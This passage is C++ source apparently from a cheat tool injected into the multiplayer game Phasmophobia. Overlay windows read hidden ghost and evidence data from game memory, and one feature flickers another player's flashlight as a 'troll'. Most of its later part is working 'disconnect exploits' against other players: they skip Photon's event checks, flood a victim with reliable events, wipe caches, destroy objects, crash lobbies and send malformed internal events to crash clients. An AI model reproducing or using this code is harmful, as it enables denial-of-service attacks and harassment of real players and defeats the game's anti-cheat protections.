            ImGui::End();
            return;
        }

        Phasmo::LevelValues* values = Phasmo_GetLevelValues();
        Phasmo::GhostInfo* ghostInfo = nullptr;
        const bool infoReady = TryGetGhostInfo(ghost, ghostInfo);
        const char* ghostTypeName = infoReady
            ? GhostTypeName(ghostInfo->ghostTypeInfo.primaryType)
            : "Unknown";
        const std::string ghostName = infoReady ? GetGhostName(ghost) : std::string{};
        const std::string favRoom = (infoReady && ghostInfo->levelRoom)
            ? GetRoomName(ghostInfo->levelRoom)
            : std::string{};
        const std::string evidencePrimary = infoReady
            ? EvidenceListToString(ghostInfo->ghostTypeInfo.evidencePrimary)
            : std::string{};
        const std::string evidenceSecondary = infoReady
            ? EvidenceListToString(ghostInfo->ghostTypeInfo.evidenceSecondary)
            : std::string{};
        const bool activityReady = ghost->ghostActivity && Phasmo_Safe(ghost->ghostActivity, 0x20);
        const bool interactionReady = ghost->ghostInteraction && Phasmo_Safe(ghost->ghostInteraction, 0x20);

        ImGui::Text("GhostAI: READY");
        ImGui::Text("Ghost Type: %s", ghostTypeName);
        ImGui::Text("Ghost Name: %s", ghostName.empty() ? "Unknown" : ghostName.c_str());
        ImGui::Text("Ghost State: %s", GhostStateName(ghost->state));
        ImGui::Text("Target Actor: %d", ghost->targetPlayerId);
        ImGui::Text("GhostActivity: %s", activityReady ? "READY" : "MISSING");
        ImGui::Text("GhostInteraction: %s", interactionReady ? "READY" : "MISSING");
        if (!favRoom.empty())
            ImGui::Text("Favourite Room: %s", favRoom.c_str());

        ImGui::Separator();
        ImGui::Text("Last Known Pos: %.1f / %.1f / %.1f",
            ghost->lastKnownPlayerPos.x,
            ghost->lastKnownPlayerPos.y,
            ghost->lastKnownPlayerPos.z);
        if (!evidencePrimary.empty())
            ImGui::TextWrapped("Evidence A: %s", evidencePrimary.c_str());
        if (!evidenceSecondary.empty())
            ImGui::TextWrapped("Evidence B: %s", evidenceSecondary.c_str());

        if (values && Phasmo_Safe(values, sizeof(Phasmo::LevelValues)) &&
            values->currentDifficulty && Phasmo_Safe(values->currentDifficulty, sizeof(Phasmo::Difficulty))) {
            ImGui::Separator();
            ImGui::Text("Difficulty: %s", DifficultyName(values->currentDifficulty->difficulty));
            ImGui::Text("Weather: %s", WeatherName(values->currentDifficulty->weather));
            ImGui::Text("Evidence Given: %d", values->currentDifficulty->evidenceGiven);
        }
        ImGui::End();
    }

    // ══════════════════════════════════════════════════════
    //  VISUAL: GHOST PROFILE
    // ══════════════════════════════════════════════════════
    static void DrawGhostProfileUnsafe()
    {
        if (!ImGui::GetCurrentContext())
            return;

        const bool inGame = IsInGame();
        const ULONGLONG nowMs = GetTickCount64();
        const bool inGameWarmup = inGame && s_inGameEnteredAtMs != 0 && (nowMs - s_inGameEnteredAtMs) < 5000;

        ImGui::SetNextWindowSize(ImVec2(340, 220), ImGuiCond_FirstUseEver);
        if (!ImGui::Begin("Ghost Profile", &VIS_GhostProfile)) {
            ImGui::End();
            return;
        }

        if (s_disableGhostProfileForSession) {
            ImGui::Text("State: DISABLED");
            ImGui::Separator();
            ImGui::TextDisabled("Ghost Profile was disabled for this session after a crash.");
            ImGui::TextDisabled("Only the safer ghost tools remain active.");
            ImGui::End();
            return;
        }

        if (!inGame) {
            ImGui::Text("State: LOBBY / MENU");
            ImGui::Separator();
            ImGui::TextDisabled("Ghost profile is disabled outside a contract.");
            ImGui::End();
            return;
        }

        if (inGameWarmup) {
            ImGui::Text("State: WARMING UP");
            ImGui::Separator();
            ImGui::TextDisabled("Waiting a few seconds after map load before reading ghost data.");
            ImGui::End();
            return;
        }

        Phasmo::GhostAI* ghost = Phasmo_GetGhostAI();
        if (!ghost || !Phasmo_Safe(ghost, 0x80)) {
            ImGui::Text("State: IN GAME");
            ImGui::Separator();
            ImGui::TextDisabled("GhostAI not available yet.");
            ImGui::End();
            return;
        }

        const bool navReady = ghost->navMeshAgent && Phasmo_Safe(ghost->navMeshAgent, 0x20);
        const bool infoReady = ghost->ghostInfo && Phasmo_Safe(ghost->ghostInfo, sizeof(Phasmo::GhostInfo));
        const bool activityReady = ghost->ghostActivity && Phasmo_Safe(ghost->ghostActivity, 0x20);
        const bool interactionReady = ghost->ghostInteraction && Phasmo_Safe(ghost->ghostInteraction, 0x20);
        Phasmo::LevelValues* values = Phasmo_GetLevelValues();
        const bool diffReady = values && Phasmo_Safe(values, sizeof(Phasmo::LevelValues)) &&
            values->currentDifficulty && Phasmo_Safe(values->currentDifficulty, sizeof(Phasmo::Difficulty));

        Phasmo::GhostInfo* ghostInfo = infoReady ? ghost->ghostInfo : nullptr;
        const bool roomReady = ghostInfo && ghostInfo->levelRoom && Phasmo_Safe(ghostInfo->levelRoom, 0x68);
        const float ghostSpeed = ghostInfo ? ghostInfo->ghostSpeed : 0.0f;
        const std::string favRoom = roomReady ? GetRoomName(ghostInfo->levelRoom) : std::string{};
        const char* ghostTypeName = ghostInfo ? GhostTypeName(ghostInfo->ghostTypeInfo.primaryType) : "Unknown";
        const std::string ghostName = ghostInfo ? GetGhostName(ghost) : std::string{};
        const std::string evidencePrimary = ghostInfo
            ? EvidenceListToString(ghostInfo->ghostTypeInfo.evidencePrimary)
            : std::string{};
        const std::string evidenceSecondary = ghostInfo
            ? EvidenceListToString(ghostInfo->ghostTypeInfo.evidenceSecondary)
            : std::string{};
        const std::string evidenceFull = ghostInfo ? GetGhostFullEvidenceString(ghostInfo) : std::string{};

        ImGui::Text("GhostAI: READY");
        ImGui::Text("Ghost State: %s", GhostStateName(ghost->state));
        ImGui::Text("NavMeshAgent: %s", navReady ? "READY" : "MISSING");
        ImGui::Text("GhostInfo: %s", infoReady ? "READY" : "MISSING");
        ImGui::Text("GhostActivity: %s", activityReady ? "READY" : "MISSING");
        ImGui::Text("GhostInteraction: %s", interactionReady ? "READY" : "MISSING");
        ImGui::Text("Target Actor: %d", ghost->targetPlayerId);
        ImGui::Text("Last Known Pos: %.1f / %.1f / %.1f",
            ghost->lastKnownPlayerPos.x,
            ghost->lastKnownPlayerPos.y,
            ghost->lastKnownPlayerPos.z);

        if (ghostInfo) {
            ImGui::Separator();
            ImGui::Text("Ghost Type: %s", ghostTypeName);
            ImGui::Text("Ghost Name: %s", ghostName.empty() ? "Unknown" : ghostName.c_str());
            ImGui::Text("Ghost Speed: %.2f", ghostSpeed);
            ImGui::Text("Evidence Count: %d", ghostInfo->ghostTypeInfo.evidenceCount);
            ImGui::Text("Favourite Room: %s", favRoom.empty() ? "Unknown" : favRoom.c_str());
            if (!evidencePrimary.empty())
                ImGui::TextWrapped("Evidence A: %s", evidencePrimary.c_str());
            if (!evidenceSecondary.empty())
                ImGui::TextWrapped("Evidence B: %s", evidenceSecondary.c_str());
            if (!evidenceFull.empty())
                ImGui::TextWrapped("Full Evidence: %s", evidenceFull.c_str());
        }

        if (diffReady) {
            ImGui::Separator();
            ImGui::Text("Difficulty: %s", DifficultyName(values->currentDifficulty->difficulty));
            ImGui::Text("Weather: %s", WeatherName(values->currentDifficulty->weather));
            ImGui::Text("Evidence Given: %d", values->currentDifficulty->evidenceGiven);
            ImGui::Text("Override Mult: %.2fx", values->currentDifficulty->overrideMultiplier);
            ImGui::Text("Ghost Speed Diff: %.2f", values->currentDifficulty->ghostSpeed);
        }

        ImGui::Separator();
        ImGui::TextDisabled("Ghost Profile now uses the validated ghost offsets from the latest dump.");
        ImGui::TextDisabled("GhostTypeInfo is now revalidated; profile fields are restored in safe mode.");
        ImGui::End();
    }

    static void DrawGhostProfile()
    {
        if (!VIS_GhostProfile) return;

        __try {
            DrawGhostProfileUnsafe();
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            s_disableGhostProfileForSession = true;
            VIS_GhostProfile = false;
            Logger::WriteLine("[Visual] Ghost Profile crashed and was disabled for this session");
        }
    }

    // ══════════════════════════════════════════════════════
    //  VISUAL: STATS WINDOW
    // ══════════════════════════════════════════════════════
    static void DrawStatsWindowUnsafe()
    {
        if (!ImGui::GetCurrentContext())
            return;

        const bool inGame = IsInGame();

        ImGui::SetNextWindowSize(ImVec2(250, 180), ImGuiCond_FirstUseEver);
        if (ImGui::Begin("Game Stats", &VIS_StatsWindow)) {
            if (inGame && s_localPlayer) {
                Phasmo::PlayerSanity* ps = Phasmo_GetPlayerSanity(s_localPlayer);
                if (ps) {
                    ImGui::Text("Sanity: %.1f%%", ps->sanity);
                }
                ImGui::Text("Player: Active");
            } else {
                ImGui::Text("Player: Not ready");
            }

            ImGui::Separator();
            ImGui::Text("State: %s", inGame ? "IN GAME" : "LOBBY / MENU");
            ImGui::Text("LevelController: %s", (inGame && s_levelCtrl) ? "READY" : "LOBBY / MISSING");

            if (inGame) {
                void* room = Phasmo_Call<void*>(Phasmo::RVA_PN_GetCurrentRoom, nullptr);
                if (room && Phasmo_Safe(room, 0x20)) {
                    Il2CppString* roomNameStr = Phasmo_Call<Il2CppString*>(
                        Phasmo::RVA_PR_GetName, room, nullptr);
                    std::string roomName = Phasmo_StringToUtf8(roomNameStr);
                    const uint8_t playerCount = Phasmo_Call<uint8_t>(Phasmo::RVA_PR_GetPlayerCount, room, nullptr);
                    ImGui::Text("Room: %s", roomName.empty() ? "Unknown" : roomName.c_str());
                    ImGui::Text("Room Players: %u", static_cast<unsigned>(playerCount));
                }

                Phasmo::GhostAI* ghost = Phasmo_GetGhostAI();
                if (ghost) {
                    ImGui::Separator();
                    ImGui::Text("Ghost: Active");
                    ImGui::Text("Target ID: %d", ghost->targetPlayerId);
                }

                Phasmo::FuseBox* fb = Phasmo_GetFuseBox();
                if (fb) {
                    ImGui::Separator();
                    ImGui::Text("Fuse Box: %s", fb->isOn ? "ON" : "OFF");
                }
            } else {
                ImGui::TextDisabled("Live room / ghost / fuse data disabled outside a contract.");
            }
        }
        ImGui::End();
    }

    static void DrawStatsWindow()
    {
        if (!VIS_StatsWindow) return;

        __try {
            DrawStatsWindowUnsafe();
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  MORE: NO CAMERA RESTRICTIONS (360)
    // ══════════════════════════════════════════════════════
    static void ApplyNoCameraRestrictions()
    {
        if (!s_localPlayer) return;

        __try {
            void* fpc = s_localPlayer->firstPersonController;
            if (!Phasmo_Safe(fpc, 0x40)) return;

            void* mouseLook = *reinterpret_cast<void**>(reinterpret_cast<uint8_t*>(fpc) + 0x38);
            if (!Phasmo_Safe(mouseLook, 0x30)) return;

            *reinterpret_cast<bool*>(reinterpret_cast<uint8_t*>(mouseLook) + 0x18) = !MORE_NoCameraRestrictions ? true : false;
            *reinterpret_cast<float*>(reinterpret_cast<uint8_t*>(mouseLook) + 0x1C) = MORE_NoCameraRestrictions ? -360.0f : -85.0f;
            *reinterpret_cast<float*>(reinterpret_cast<uint8_t*>(mouseLook) + 0x20) = MORE_NoCameraRestrictions ? 360.0f : 85.0f;
            if (Phasmo_Safe(reinterpret_cast<uint8_t*>(mouseLook) + 0x24, sizeof(bool)))
                *reinterpret_cast<bool*>(reinterpret_cast<uint8_t*>(mouseLook) + 0x24) = false;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    //  MORE: SPAM FLASHLIGHT (VISIBLE / NETWORK-DRIVEN)
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    static void* ResolveLocalFlashlight()
    {
        if (!s_localPlayer || !Phasmo_Safe(s_localPlayer, sizeof(Phasmo::Player)))
            return nullptr;

        void* flashlight = s_localPlayer->pcFlashlight;
        if (!flashlight && s_localPlayer->pcPropGrab && Phasmo_Safe(s_localPlayer->pcPropGrab, sizeof(Phasmo::PCPropGrab))) {
            flashlight = reinterpret_cast<Phasmo::PCPropGrab*>(s_localPlayer->pcPropGrab)->pcFlashlight;
        }
        return (flashlight && Phasmo_Safe(flashlight, 0x70)) ? flashlight : nullptr;
    }

    static void* ResolvePlayerFlashlight(Phasmo::Player* player)
    {
        if (!player || !Phasmo_Safe(player, sizeof(Phasmo::Player)))
            return nullptr;

        void* flashlight = player->pcFlashlight;
        if (!flashlight && player->pcPropGrab && Phasmo_Safe(player->pcPropGrab, sizeof(Phasmo::PCPropGrab))) {
            flashlight = reinterpret_cast<Phasmo::PCPropGrab*>(player->pcPropGrab)->pcFlashlight;
        }
        return (flashlight && Phasmo_Safe(flashlight, 0x70)) ? flashlight : nullptr;
    }

    static ULONGLONG AdvanceFlashlightPattern(ULONGLONG now, int delayMs, bool& ioState, int& ioStep)
    {
        switch (MORE_SpamFlashlightMode)
        {
        default:
        case 0:
            ioState = !ioState;
            return now + static_cast<ULONGLONG>(delayMs);

        case 1:
        {
            static const bool kStates[] = { true, false, true, false, true, false, false };
            static const int kDelayMult[] = { 1, 1, 1, 1, 1, 2, 5 };
            const int idx = ioStep % static_cast<int>(std::size(kStates));
            ioState = kStates[idx];
            ioStep = (idx + 1) % static_cast<int>(std::size(kStates));
            return now + static_cast<ULONGLONG>(delayMs * kDelayMult[idx]);
        }

        case 2:
        {
            static const bool kStates[] =
            {
                true, false, true, false, true, false,
                true, false, true, false, true, false, true, false,
                true, false, true, false, true, false
            };
            static const int kDelayMult[] =
            {
                1, 1, 1, 1, 1, 3,
                3, 1, 3, 1, 3, 1, 3, 3,
                1, 1, 1, 1, 1, 6
            };
            const int idx = ioStep % static_cast<int>(std::size(kStates));
            ioState = kStates[idx];
            ioStep = (idx + 1) % static_cast<int>(std::size(kStates));
            return now + static_cast<ULONGLONG>(delayMs * kDelayMult[idx]);
        }

        case 3:
        {
            static const bool kStates[] = { true, false, true, false, true, false, true, false };
            static const int kDelayMult[] = { 1, 3, 1, 1, 2, 4, 1, 2 };
            const int idx = ioStep % static_cast<int>(std::size(kStates));
            ioState = kStates[idx];
            ioStep = (idx + 1) % static_cast<int>(std::size(kStates));
            return now + static_cast<ULONGLONG>(delayMs * kDelayMult[idx]);
        }
        }
    }

    static void ApplySpamFlashlight()
    {
        static bool s_flashlightState = false;
        static ULONGLONG s_nextToggleMs = 0;
        static int s_flashlightPatternStep = 0;

        if (!MORE_SpamFlashlight || !s_localPlayer || !IsInGame()) {
            s_flashlightState = false;
            s_nextToggleMs = 0;
            s_flashlightPatternStep = 0;
            return;
        }

        int delayMs = MORE_SpamFlashlightDelayMs;
        if (delayMs < 10) delayMs = 10;
        if (delayMs > 1000) delayMs = 1000;

        ULONGLONG now = GetTickCount64();
        if (now < s_nextToggleMs)
            return;

        void* flashlight = ResolveLocalFlashlight();
        if (!flashlight)
            return;

        s_nextToggleMs = AdvanceFlashlightPattern(now, delayMs, s_flashlightState, s_flashlightPatternStep);

        // Call the public wrapper instead of poking the Light component directly:
        // this is the path most likely to fan out through the game's network sync.
        Phasmo_Call<void>(Phasmo::RVA_PCFlashlight_EnableOrDisableLight, flashlight,
            s_flashlightState, true, nullptr);
    }

    static void ApplyTargetFlashlightTroll()
    {
        static bool s_targetFlashlightState = false;
        static ULONGLONG s_nextTargetToggleMs = 0;
        static int s_targetFlashlightPatternStep = 0;
        static int s_lastTargetSlot = -2;

        if (!MORE_TargetFlashlightTroll || !IsInGame()) {
            s_targetFlashlightState = false;
            s_nextTargetToggleMs = 0;
            s_targetFlashlightPatternStep = 0;
            s_lastTargetSlot = -2;
            return;
        }

        const int targetSlot = MORE_DropTargetSlot;
        if (targetSlot < 0)
            return;

        if (targetSlot != s_lastTargetSlot) {
            s_targetFlashlightState = false;
            s_nextTargetToggleMs = 0;
            s_targetFlashlightPatternStep = 0;
            s_lastTargetSlot = targetSlot;
        }

        Phasmo::Player* target = ResolvePlayerSlot(targetSlot);
        if (!target || target == s_localPlayer)
            return;

        void* flashlight = ResolvePlayerFlashlight(target);
        if (!flashlight)
            return;

        int delayMs = MORE_SpamFlashlightDelayMs;
        if (delayMs < 10) delayMs = 10;
        if (delayMs > 1000) delayMs = 1000;

        ULONGLONG now = GetTickCount64();
        if (now < s_nextTargetToggleMs)
            return;

        s_nextTargetToggleMs = AdvanceFlashlightPattern(now, delayMs,
            s_targetFlashlightState, s_targetFlashlightPatternStep);

        Phasmo_Call<void>(Phasmo::RVA_PCFlashlight_EnableOrDisableLight, flashlight,
            s_targetFlashlightState, true, nullptr);
    }

    static void* FindHeldTorch()
    {
        if (!s_localPlayer || !s_localPlayer->pcPropGrab || !Phasmo_Safe(s_localPlayer->pcPropGrab, sizeof(Phasmo::PCPropGrab)))
            return nullptr;

        auto* grab = reinterpret_cast<Phasmo::PCPropGrab*>(s_localPlayer->pcPropGrab);
        void* heldTransform = grab->heldTransform;
        if (!heldTransform || !Phasmo_Safe(heldTransform, 0xC0))
            return nullptr;

        Phasmo::Vec3 heldPos = Phasmo_GetPosition(heldTransform);
        Phasmo::Il2CppArray* arr = Phasmo_FindObjectsOfTypeAll("", "Torch");
        if (!arr || !Phasmo_Safe(arr, Phasmo::ARRAY_FIRST_ELEMENT + sizeof(void*)))
            return nullptr;

        const int32_t count = arr->max_length;
        if (count <= 0 || count > 256)
            return nullptr;

        void** items = reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(arr) + Phasmo::ARRAY_FIRST_ELEMENT);

        void* bestTorch = nullptr;
        float bestDistSq = 0.15f * 0.15f;

        for (int32_t i = 0; i < count; ++i)
        {
            void* torch = items[i];
            if (!torch || !Phasmo_Safe(torch, 0x208))
                continue;

            void* torchTransform = Phasmo_Call<void*>(Phasmo::RVA_UnityEngine_Component_get_transform, torch, nullptr);
            if (!torchTransform || !Phasmo_Safe(torchTransform, 0xC0))
                continue;

            if (torchTransform == heldTransform)
                return torch;

            Phasmo::Vec3 torchPos = Phasmo_GetPosition(torchTransform);
            const float dx = torchPos.x - heldPos.x;
            const float dy = torchPos.y - heldPos.y;
            const float dz = torchPos.z - heldPos.z;
            const float distSq = dx * dx + dy * dy + dz * dz;
            if (distSq <= bestDistSq) {
                bestDistSq = distSq;
                bestTorch = torch;
            }
        }

        return bestTorch;
    }

    static void ApplyTorchUseSpam()
    {
        static ULONGLONG s_nextTorchUseMs = 0;

        if (!MORE_TorchUseSpam || !s_localPlayer || !IsInGame()) {
            s_nextTorchUseMs = 0;
            return;
        }

        int delayMs = MORE_TorchUseSpamDelayMs;
        if (delayMs < 50) delayMs = 50;
        if (delayMs > 2000) delayMs = 2000;

        ULONGLONG now = GetTickCount64();
        if (now < s_nextTorchUseMs)
            return;

        void* torch = FindHeldTorch();
        if (!torch)
            return;

        s_nextTorchUseMs = now + static_cast<ULONGLONG>(delayMs);
        Phasmo_Call<void>(Phasmo::RVA_Equipment_Use, torch, nullptr);
    }


    // ══════════════════════════════════════════════════════
    //  LOW-LEVEL PHOTON HELPERS
    //
    //  WHY: PhotonNetwork.RaiseEvent (static, 0x3F4A330) has TWO critical checks:
    //    1. Rejects event codes >= 200 (all internal PUN codes: RPC=200, Instantiate=202, Destroy=204, Properties=253)
    //    2. Checks InRoom — returns false in lobby
    //  This means ALL previous exploit methods were silently failing!
    //
    //  FIX: Call LoadBalancingPeer.OpRaiseEvent (0x3F29E20) directly.
    //  This is the raw Photon transport method — no event code filtering, no InRoom check.
    //  The Photon relay server forwards events regardless of code.
    // ══════════════════════════════════════════════════════

    // Get LoadBalancingPeer from PhotonNetwork.NetworkingClient
    static void* GetPhotonPeer()
    {
        void* lbc = Phasmo_GetPhotonNetworkClient();
        if (!lbc || !Phasmo_Safe(lbc, 0x20)) return nullptr;
        // LoadBalancingPeer is at offset 0x10 (field 0x00 + 0x10 IL2CPP header)
        void* peer = *reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(lbc) + Phasmo::LBC_PEER);
        return (peer && Phasmo_Safe(peer, 0x40)) ? peer : nullptr;
    }

    // Pack SendOptions value type into uint64 for register passing (sizeof == 8 with padding)
    static uint64_t PackSendOptions(bool reliable)
    {
        ExitGames_Client_Photon_SendOptions_Fields so{};
        so.DeliveryMode = reliable ? 1 : 0;
        so.Encrypt = false;
        so.Channel = 0;
        uint64_t raw = 0;
        memcpy(&raw, &so, sizeof(so));
        return raw;
    }

    // Allocate RaiseEventOptions targeting a single actor
    static Photon_Realtime_RaiseEventOptions_o* MakeREO_Targeted(int actor)
    {
        Il2CppClass* reoClass = Phasmo_GetClass("Photon.Realtime", "RaiseEventOptions", "PhotonRealtime");
        Il2CppClass* intClass = Phasmo_GetSystemClass("Int32");
        if (!reoClass || !intClass) return nullptr;

        auto* arr = Phasmo_ArrayNew(intClass, 1);
        if (!arr) return nullptr;
        *reinterpret_cast<int32_t*>(
            reinterpret_cast<uint8_t*>(arr) + Phasmo::ARRAY_FIRST_ELEMENT) = actor;

        auto* reo = reinterpret_cast<Photon_Realtime_RaiseEventOptions_o*>(Phasmo_ObjectNew(reoClass));
        if (!reo) return nullptr;
        Phasmo_RuntimeObjectInit(reinterpret_cast<Il2CppObject*>(reo));

        reo->fields.CachingOption = 0;
        reo->fields.InterestGroup = 0;
        reo->fields.TargetActors = reinterpret_cast<System_Int32_array*>(arr);
        reo->fields.Receivers = 0;
        reo->fields.SequenceChannel = 0;
        reo->fields.Flags = nullptr;
        return reo;
    }

    // Allocate RaiseEventOptions broadcasting to Others (everyone except self)
    static Photon_Realtime_RaiseEventOptions_o* MakeREO_Others()
    {
        Il2CppClass* reoClass = Phasmo_GetClass("Photon.Realtime", "RaiseEventOptions", "PhotonRealtime");
        if (!reoClass) return nullptr;

        auto* reo = reinterpret_cast<Photon_Realtime_RaiseEventOptions_o*>(Phasmo_ObjectNew(reoClass));
        if (!reo) return nullptr;
        Phasmo_RuntimeObjectInit(reinterpret_cast<Il2CppObject*>(reo));

        reo->fields.CachingOption = 0;
        reo->fields.InterestGroup = 0;
        reo->fields.TargetActors = nullptr;
        reo->fields.Receivers = 0;  // ReceiverGroup.Others = 0
        reo->fields.SequenceChannel = 0;
        reo->fields.Flags = nullptr;
        return reo;
    }

    // Send event via LoadBalancingPeer.OpRaiseEvent — bypasses ALL PhotonNetwork checks
    // Instance method: bool LBP.OpRaiseEvent(byte code, object content, REO options, SendOptions so)
    static bool SendEventLowLevel(void* peer, uint8_t code, void* content,
                                   Photon_Realtime_RaiseEventOptions_o* reo, bool reliable)
    {
        if (!peer || !reo) return false;
        uint64_t so = PackSendOptions(reliable);
        return Phasmo_Call<bool>(Phasmo::RVA_LBP_OpRaiseEvent,
            peer, code, content, reo, so, nullptr);
    }

    // Flush outgoing commands via PhotonPeer.SendOutgoingCommands
    static void FlushPeer(void* peer)
    {
        if (peer)
            Phasmo_Call<bool>(Phasmo::RVA_PP_SendOutgoingCommands, peer, nullptr);
    }

    // Resolve actor number from slot index (fallback for old code paths)
    static int ResolveActorNumber(int slot)
    {
        Phasmo::Player* target = ResolvePlayerSlot(slot);
        Phasmo::NetworkPlayerSpot* spot = target ? GetPlayerSpot(target) : GetNetworkSpotAtIndex(slot);

        if (spot && spot->photonPlayer && Phasmo_Safe(spot->photonPlayer, 0x20))
            return *reinterpret_cast<int32_t*>(
                reinterpret_cast<uint8_t*>(spot->photonPlayer) + Phasmo::PP_ACTOR_NUMBER);

        if (target && target->photonView && Phasmo_Safe(target->photonView, 0x40)) {
            void* owner = Phasmo_Call<void*>(Phasmo::RVA_PV_get_Owner, target->photonView, nullptr);
            if (owner && Phasmo_Safe(owner, 0x20))
                return *reinterpret_cast<int32_t*>(
                    reinterpret_cast<uint8_t*>(owner) + Phasmo::PP_ACTOR_NUMBER);
        }

        return -1;
    }

    // ══════════════════════════════════════════════════════
    //  DISCONNECT EXPLOITS — Non-host Photon vulnerabilities
    //
    //  All modes now use LoadBalancingPeer.OpRaiseEvent (0x3F29E20)
    //  instead of PhotonNetwork.RaiseEvent (0x3F4A330).
    //
    //  Mode 0: DESYNC — Cache wipe + object destruction via PN static methods.
    //          Removes buffered events/RPCs from Photon server,
    //          then destroys target's networked objects.
    //          Target loses sync → game consistency checks disconnect them.
    //          Also sends event burst via LBP as backup.
    //
    //  Mode 1: FLOOD — Reliable event flood via LBP.OpRaiseEvent.
    //          Sends 300 large (4KB) reliable events targeted at victim.
    //          Each reliable command requires ACK. Queue overflow triggers
    //          eNet MaxResendsBeforeDisconnect → transport-level disconnect.
    //          ★ MOST RELIABLE METHOD. Bypasses anti-kick. Works lobby & in-game.
    //
    //  Mode 2: LOBBY CRASH — DestroyAll + cache wipe.
    //          Every player loses all networked state simultaneously.
    //          WARNING: Affects ALL players including yourself.
    //
    //  Mode 3: CORRUPT — Sends PUN internal events (253/PropertiesChanged)
    //          with null content via LBP to target. Target's PUN client
    //          crashes on deserialization (NullReferenceException).
    //          Works because LBP doesn't filter event codes >= 200.
    //
    //  Mode 4: OWNERSHIP CHAOS — Rapid TransferOwnership ping-pong
    //          on target's PhotonView IDs. Creates constant ownership
    //          conflicts → desync → eventual disconnect.
    //
    //  Mode 5: GHOST — Sends Destroy events (code 204) via LBP
    //          broadcast to all other clients with target's viewIDs.
    //          Others remove target's objects — target becomes invisible.
    //
    //  Mode 6: COMBINED — All methods simultaneously.
    //          Maximum disruption. Almost guaranteed disconnect.
    // ══════════════════════════════════════════════════════

    // ─── Mode 0: Desync ───
    static void DisconnectMode_Desync(int actor)
    {
        // PN static cache operations — may require host for some, but worth trying
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_OpRemoveCompleteCacheOfPlayer, actor, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_OpCleanActorRpcBuffer, actor, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_DestroyPlayerObjsId, actor, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_DestroyPlayerObjsLocal, actor, false, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_OpRemoveFromServerInstantiations, actor, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_SendAllOutgoingCommands, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}

        // Backup: send burst of reliable events via LBP to add pressure
        void* peer = GetPhotonPeer();
        if (peer) {
            auto* reo = MakeREO_Targeted(actor);
            if (reo) {
                for (int i = 0; i < 50; ++i)
                    SendEventLowLevel(peer, 1, nullptr, reo, true);
                FlushPeer(peer);
            }
        }

        Logger::WriteLine("[Phasmo] Desync sent for actor %d", actor);
    }

    // ─── Mode 1: Flood (★ most reliable) ───
    static void DisconnectMode_Flood(int actor)
    {
        void* peer = GetPhotonPeer();
        if (!peer) {
            Logger::WriteLine("[Phasmo] Flood: no peer (not connected)");
            return;
        }

        auto* reo = MakeREO_Targeted(actor);
        if (!reo) {
            Logger::WriteLine("[Phasmo] Flood: failed to create RaiseEventOptions");
            return;
        }

        // 4KB payload — large enough to stress eNet reliable queue
        Il2CppClass* byteClass = Phasmo_GetSystemClass("Byte");
        Phasmo::Il2CppArray* payload = byteClass ? Phasmo_ArrayNew(byteClass, 4096) : nullptr;

        // 300 reliable events → each requires ACK from target
        // Total: ~1.2MB of reliable data flooding the target
        int sent = 0;
        for (int i = 0; i < 300; ++i) {
            if (SendEventLowLevel(peer, static_cast<uint8_t>(1 + (i % 100)), payload, reo, true))
                ++sent;
        }

        FlushPeer(peer);

        // Also strip their cache for good measure
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_OpRemoveCompleteCacheOfPlayer, actor, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_OpCleanActorRpcBuffer, actor, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_SendAllOutgoingCommands, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}

        Logger::WriteLine("[Phasmo] Flood: %d/300 events sent to actor %d", sent, actor);
    }

    // ─── Mode 2: Lobby Crash ───
    static void DisconnectMode_LobbyCrash()
    {
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_OpRemoveCompleteCache, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_DestroyAll, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_SendAllOutgoingCommands, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}

        // Also send via LBP for max damage
        void* peer = GetPhotonPeer();
        if (peer) {
            auto* reo = MakeREO_Others();
            if (reo) {
                // Send destroy + corrupt events to all other players
                for (int i = 0; i < 50; ++i) {
                    SendEventLowLevel(peer, 204, nullptr, reo, true);
                    SendEventLowLevel(peer, 253, nullptr, reo, true);
                }
                FlushPeer(peer);
            }
        }

        Logger::WriteLine("[Phasmo] Lobby crash executed");
    }

    // ─── Mode 3: Corrupt (internal event abuse) ───
    static void DisconnectMode_Corrupt(int actor)
    {
        void* peer = GetPhotonPeer();
        if (!peer) {
            Logger::WriteLine("[Phasmo] Corrupt: no peer");
            return;
        }

        auto* reo = MakeREO_Targeted(actor);
        if (!reo) {
            Logger::WriteLine("[Phasmo] Corrupt: failed to create RaiseEventOptions");
            return;
        }

        // Event 253 = PropertiesChanged — PUN internal code
        // Null content → NullReferenceException on target during deserialization
        // This ONLY works via LBP.OpRaiseEvent (PN.RaiseEvent rejects code >= 200!)
